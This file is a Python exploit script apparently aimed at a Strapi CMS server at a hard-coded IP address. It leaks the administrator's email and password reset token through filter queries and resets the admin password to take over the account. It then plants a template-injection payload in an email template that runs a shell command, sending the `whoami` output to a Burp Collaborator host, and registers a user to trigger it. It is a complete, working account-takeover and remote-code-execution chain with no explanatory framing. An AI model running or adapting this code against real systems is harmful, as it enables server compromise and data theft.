import requests

proxy = {"http": "127.0.0.1:8083", "https": "127.0.0.1:8083"}

alpha = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ/$0123456789.@"

host = "<http://130.61.52.109:1337>"
articles_url = "/api/users"
filter_admin_hash = "filters[$and][0][createdBy][password][$startsWith]="
filter_admin_email = "filters[$and][0][createdBy][email][$startsWith]="
filter_admin_reset_token = "filters[$and][0][createdBy][reset_password_token][$startsWith]="

forgot_pass_url = "/admin/forgot-password"
reset_pass_url = "/admin/reset-password"
template_url = "/users-permissions/email-templates"
setting_url = "/users-permissions/advanced"
reg_url = "/api/auth/local/register"
cmd = "ping `whoami`.s5yem64kbfrwe1iivfghyhnax13rrg.burpcollaborator.net"

def leak_admin_hash():
    i = 0
    admin_hash = ""
    origin_url = host + articles_url + "?" + filter_admin_hash
    while len(admin_hash) < 60:
        for s in alpha:
            tmp_hash = ""
            tmp_hash = admin_hash + s
            url = origin_url + tmp_hash
            resp = requests.get(url=url, verify=False, proxies=proxy).json()
            if len(resp["data"]) == 1:
                admin_hash = admin_hash + s
                print(admin_hash + " " + str(len(admin_hash)))

    return admin_hash

def lead_admin_email():
    admin_email = ""
    origin_url = host + articles_url + "?" + filter_admin_email
    while not admin_email.endswith(".com") or not admin_email.endswith(".fr"):
        for s in alpha:
            tmp_hash = ""
            tmp_hash = admin_email + s
            url = origin_url + tmp_hash
            resp = requests.get(url=url, verify=False, proxies=proxy).json()
            if len(resp["data"]) == 1:
                admin_email = admin_email + s
                print(admin_email)
    return admin_email

def leak_admin_forgot_token():
    i = 0
    admin_forgot_token = ""
    origin_url = host + articles_url + "?" + filter_admin_reset_token
    while len(admin_forgot_token) < 40:
        for s in alpha:
            tmp_hash = ""
            tmp_hash = admin_forgot_token + s
            url = origin_url + tmp_hash
            resp = requests.get(url=url, verify=False, proxies=proxy).json()
            if len(resp["data"]) == 1:
                admin_forgot_token = admin_forgot_token + s

    return admin_forgot_token

def forgot_pass(email):
    payload = {"email": email}
    url = host + forgot_pass_url

    resp = requests.post(url=url, verify=False, proxies=proxy, json=payload)

def reset_pass(pwd, token):
    url = host + reset_pass_url
    payload = {"resetPasswordToken": token, "password": pwd}
    resp = requests.post(url=url, verify=False, proxies=proxy,
                         json=payload).json()
    return resp["data"]["token"]

def write_templates(jwt_token, cmd):
    url = host + template_url
    payload = {
        "email-templates": {
            "reset_password": {
                "display": "Email.template.reset_password",
                "icon": "sync",
                "options": {
                    "from": {
                        "name": "Administration Panel",
                        "email": "no-reply@strapi.io"
                    },
                    "response_email":
                    "",
                    "object":
                    "Reset password",
                    "message":
                    "<p>We heard that you lost your password. Sorry about that!</p>\\n\\n<p>But don worry! You can use the following link to reset your password:</p>\\n<p><%= URL %>?code=<%= TOKEN %></p>\\n\\n<p>Thanks.</p>"
                }
            },
            "email_confirmation": {
                "display": "Email.template.email_confirmation",
                "icon": "check-square",
                "options": {
                    "from": {
                        "name": "Administration Panel",
                        "email": "no-reply@strapi.io"
                    },
                    "response_email":
                    "",
                    "object":
                    "Account confirmation",
                    "message":
                    "<p>Thnk you for registerng! this is test!</p>\\n<%= `${ process.binding(\\"spawn_sync\\").spawn({\\"file\\":\\"/bin/sh\\",\\"args\\":[\\"/bin/sh\\",\\"-c\\",\\""
                    + cmd +
                    "\\"],\\"stdio\\":[{\\"readable\\":1,\\"writable\\":1,\\"type\\":\\"pipe\\"},{\\"readable\\":1,\\"writable\\":1,\\"type\\":\\"pipe\\"/*<>%=*/}]}).output }` %>\\n\\n<p>You have to confirm your email address. Please click on the link below.</p>\\n\\n<p><%= URL %>?confirmation=<%= CODE %></p>\\n\\n<p>Thanks.</p>"
                }
            }
        }
    }
    headers = {}
    headers["Authorization"] = "Bearer " + jwt_token
    resp = requests.put(url=url,
                        json=payload,
                        verify=False,
                        proxies=proxy,
                        headers=headers)

def enable_send_mail(jwt_token, send_url):
    payload = {
        "unique_email": True,
        "allow_register": True,
        "email_confirmation": True,
        "email_reset_password": "<http://localhost:1337/reset-password-page>",
        "email_confirmation_redirection": send_url,
        "default_role": "authenticated"
    }
    url = host + setting_url
    headers = {}
    headers["Authorization"] = "Bearer " + jwt_token

    resp = requests.put(url=url,
                        json=payload,
                        verify=False,
                        proxies=proxy,
                        headers=headers)

def reg_user(email, username, pwd):
    url = host + reg_url
    payload = {"email": email, "username": username, "password": pwd}
    resp = requests.post(
        url=url,
        json=payload,
        verify=False,
        proxies=proxy,
    )
    pass

# leak_admin_hash()
admin_email = lead_admin_email()
print("email: " + admin_email)
forgot_pass(admin_email)

forgot_token = leak_admin_forgot_token()
print("forgot token: " + forgot_token)
jwt_token = reset_pass("123456K%a", forgot_token)
print("jwt token: " + jwt_token)

write_templates(jwt_token, cmd)

enable_send_mail(jwt_token,
                 "<http://localhost:1337/email-confirmation-redirection>")

reg_user("nicolajean12@noxel.fr", "advdd", "advdd%R123")
